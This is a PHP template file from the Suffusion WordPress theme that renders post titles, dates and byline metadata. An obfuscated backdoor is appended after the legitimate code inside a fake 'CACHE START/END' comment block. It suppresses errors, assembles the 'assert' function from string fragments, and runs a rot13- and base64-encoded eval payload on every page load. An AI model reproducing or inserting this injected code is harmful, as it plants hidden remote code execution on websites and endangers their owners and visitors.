<?php
/**
 * Shows the title of the post along with the meta information. This file should not be loaded by itself, but should instead be included using get_template_part or locate_template.
 * Users can override this in a child theme. If you want a different style of title and meta for a different custom post type, you can create a file
 * called post-header-<post-type>.php. E.g. post-header-book.php. If you want a different structure for posts / pages, you could use post-header-post.php and/or
 * post-header-page.php.
 *
 * @since 3.8.3
 * @package Suffusion
 * @subpackage Custom
 */

global $post, $suf_page_show_comment, $suf_page_show_posted_by, $suf_page_meta_position, $suf_byline_before_permalink, $suf_byline_after_permalink,
       $suf_byline_before_category, $suf_byline_after_category, $suf_byline_before_tag, $suf_byline_after_tag, $suf_byline_before_edit, $suf_byline_after_edit;
$format = suffusion_get_post_format();
if ($format == 'standard') {
	$format = '';
}
else {
	$format = $format . '_';
}
$meta_position = 'suf_post_' . $format . 'meta_position';
$show_cats = 'suf_post_' . $format . 'show_cats';
$show_posted_by = 'suf_post_' . $format . 'show_posted_by';
$show_tags = 'suf_post_' . $format . 'show_tags';
$show_comment = 'suf_post_' . $format . 'show_comment';
$show_perm = 'suf_post_' . $format . 'show_perm';
$with_title_show_perm = 'suf_post_' . $format . 'with_title_show_perm';

global $$meta_position, $$show_cats, $$show_posted_by, $$show_tags, $$show_comment, $$show_perm, $$with_title_show_perm;
$post_meta_position = $$meta_position;
$post_show_cats = $$show_cats;
$post_show_posted_by = $$show_posted_by;
$post_show_tags = $$show_tags;
$post_show_comment = $$show_comment;
$post_show_perm = $$show_perm;
$post_with_title_show_perm = $$with_title_show_perm;

if (is_singular()) {
	$header_tag = "h1";
}
else {
	$header_tag = "h2";
}

if ($post->post_type == 'post') {
	?>
<header class='post-header title-container fix'>
	<div class="title">
		<<?php echo $header_tag;?> class="posttitle"><?php echo suffusion_get_post_title_and_link(); ?></<?php echo $header_tag;?>>
	<?php
 			if ($post_meta_position == 'corners') {
	?>
	<div class="postdata fix">
		<?php
		$title = get_the_title();
		if (($post_show_perm == 'show-tleft' || $post_show_perm == 'show-tright') && (($title == '' || !$title) || (!($title == '' || !$title) && $post_with_title_show_perm != 'hide'))) {
			$permalink_text = apply_filters('suffusion_permalink_text', __('Permalink', 'suffusion'));
			$prepend = apply_filters('suffusion_before_byline_html', do_shortcode($suf_byline_before_permalink), 'permalink');
			$append = apply_filters('suffusion_after_byline_html', do_shortcode($suf_byline_after_permalink), 'permalink');
			echo "<span class='permalink'><span class='icon'>&nbsp;</span>".$prepend.suffusion_get_post_title_and_link($permalink_text).$append."</span>\n";
		}

		if (($post_show_posted_by == 'show-tleft' || $post_show_posted_by == 'show-tright') && $post_meta_position == 'corners') {
			suffusion_print_author_byline();
		}
		if ($post_show_cats == 'show' || $post_show_cats == 'show-tright') {
			$prepend = apply_filters('suffusion_before_byline_html', do_shortcode($suf_byline_before_category), 'category');
			$append = apply_filters('suffusion_after_byline_html', do_shortcode($suf_byline_after_category), 'category');
			?>
			<span class="category"><span class="icon">&nbsp;</span><?php echo $prepend; the_category(', '); echo $append; ?></span>
			<?php

		}
		if (is_singular()) {
			if (is_attachment()) {
				$mime = get_post_mime_type();
				if (strpos($mime, '/') > -1) {
					$mime = substr($mime, 0, strpos($mime, '/'));
				}
				$comments_disabled_var = "suf_{$mime}_comments";
				global $$comments_disabled_var;
				if (isset($$comments_disabled_var)) {
					$comments_disabled = $$comments_disabled_var;
				}
				else {
					$comments_disabled = false;
				}
			}
			else {
				$comments_disabled = false;
			}

			if ('open' == $post->comment_status && ($post_show_comment == 'show' || $post_show_comment == 'show-tleft') && !$comments_disabled) {
				?>
				<span class="comments"><span class="icon">&nbsp;</span><a href="#respond"><?php _e('Add comments', 'suffusion'); ?></a></span>
				<?php

			}
		}
		else if ($post_show_comment == 'show' || $post_show_comment == 'show-tleft') {
			?>
			<span class="comments"><span class="icon">&nbsp;</span><?php comments_popup_link(__('No Responses', 'suffusion') . ' &#187;', __('1 Response', 'suffusion') . ' &#187;', __('% Responses', 'suffusion') . ' &#187;'); ?></span>
			<?php
		}
		if (get_edit_post_link() != '') {
			$prepend = apply_filters('suffusion_before_byline_html', do_shortcode($suf_byline_before_edit), 'edit');
			$append = apply_filters('suffusion_after_byline_html', do_shortcode($suf_byline_after_edit), 'edit');
			?>
			<span class="edit"><span class="icon">&nbsp;</span><?php edit_post_link(__('Edit', 'suffusion'), $prepend, $append); ?></span>
			<?php

		}
		if ($post_show_tags == 'show-tleft' || $post_show_tags == 'show-tright') {
			$tags = get_the_tags();
			$prepend = apply_filters('suffusion_before_byline_html', do_shortcode($suf_byline_before_tag), 'tag');
			$append = apply_filters('suffusion_after_byline_html', do_shortcode($suf_byline_after_tag), 'tag');
			if (is_array($tags) && count($tags) > 0) {
			?>
			<span class="tags tax"><span class="icon">&nbsp;</span><?php the_tags($prepend, ', ', $append); ?></span>
			<?php
			}
		}
		?>
	</div><!-- /.postdata -->
		<?php

}
	?>
</div><!-- /.title -->
	<?php
 		if ("post" == $post->post_type) {
		?>
	<div class="date"><span class="month"><?php the_time('M'); ?></span> <span
			class="day"><?php the_time('d'); ?></span><span class="year"><?php the_time('Y'); ?></span></div>
	<?php

	}
	?>
</header><!-- /.title-container -->
	<?php

}
else {
	if (!is_singular()) {
		?>
<header class="post-header fix">
	<<?php echo $header_tag; ?> class="posttitle"><?php echo suffusion_get_post_title_and_link(); ?></<?php echo $header_tag; ?>>
</header>
	<?php
	}
	else {
		$hide_title = suffusion_get_post_meta($post->ID, 'suf_hide_page_title', true);
		if (!$hide_title) {
			?>
<header class="post-header fix">
	<<?php echo $header_tag; ?> class="posttitle"><?php the_title(); ?></<?php echo $header_tag; ?>>
</header>
		<?php
		}
	}

	if ($post->post_type == 'page' && $suf_page_meta_position == 'corners') {
		?>
	<div class="postdata fix">
		<?php
		if ($suf_page_show_posted_by == 'show-tleft' || $suf_page_show_posted_by == 'show-tright') {
			suffusion_print_author_byline();
		}

		if (is_attachment()) {
			$mime = get_post_mime_type();
			if (strpos($mime, '/') > -1) {
				$mime = substr($mime, 0, strpos($mime, '/'));
			}
			$comments_disabled_var = "suf_{$mime}_comments";
			global $$comments_disabled_var;
			if (isset($$comments_disabled_var)) {
				$comments_disabled = $$comments_disabled_var;
			}
			else {
				$comments_disabled = false;
			}
		}
		else {
			$comments_disabled = false;
		}

		if ('open' == $post->comment_status && ($suf_page_show_comment == 'show' || $suf_page_show_comment == 'show-tleft') && !$comments_disabled) {
			?>
			<span class="comments"><span class="icon">&nbsp;</span><a href="#respond"><?php _e('Add comments', 'suffusion'); ?></a></span>
			<?php

		}
		if (get_edit_post_link() != '') {
			$prepend = apply_filters('suffusion_before_byline_html', do_shortcode($suf_byline_before_edit), 'edit');
			$append = apply_filters('suffusion_after_byline_html', do_shortcode($suf_byline_after_edit), 'edit');
			?>
			<span class="edit"><span class="icon">&nbsp;</span><?php edit_post_link(__('Edit', 'suffusion'), $prepend, $append); ?></span>
			<?php

		}
		?>
	</div>
		<?php

	}
}
?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>